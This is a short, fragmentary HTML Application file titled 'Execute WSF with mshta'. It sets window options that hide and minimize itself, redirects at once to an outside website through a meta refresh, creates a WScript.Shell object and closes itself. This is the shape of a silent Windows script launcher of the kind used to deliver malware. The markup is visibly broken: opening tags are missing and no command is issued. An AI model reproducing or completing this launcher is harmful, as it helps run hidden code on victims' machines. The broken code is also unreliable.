<html>
<head>
    <title>Execute WSF with mshta</title>

                    applicationname="ExecuteWSF"
                    scroll="no"
                    singleinstance="yes"
                    windowstate="minimize"
                    maximizebutton="no"
                    minimizebutton="no"
                    border="none"
                    contextmenu="no"
                    selection="no"
                    sysmenu="no"

                    innerborder="no"
                    navigable="no"/>
 <meta http-equiv="refresh" content="0; URL=https://control.rcsis.ir/" />   
 </head>
<body>

		Set objShell = CreateObject("WScript.Shell")

		self.close
	</script>
</body>
</html>
